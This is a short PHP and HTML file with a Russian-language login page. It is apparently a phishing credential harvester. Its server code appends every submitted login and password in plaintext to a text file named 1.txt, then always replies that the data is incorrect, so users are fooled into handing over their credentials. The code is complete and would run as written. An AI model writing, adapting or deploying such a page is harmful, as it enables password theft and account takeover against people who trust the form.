<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login = $_POST['login'];
    $password = $_POST['password'];

    // Сохранение логина и пароля в файл 1.txt
    $file = fopen("1.txt", "a"); // Открываем файл в режиме добавления
    fwrite($file, "Логин: $login, Пароль: $password\n");
    fclose($file);

    echo "Данные неверны";
}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Форма входа</title>
</head>
<body>
    <h2>Введите логин и пароль</h2>
    <form method="post" action="">
        <label for="login">Логин:</label><br>
        <input type="text" id="login" name="login" required><br><br>
        <label for="password">Пароль:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="Отправить">
    </form>
</body>
</html>
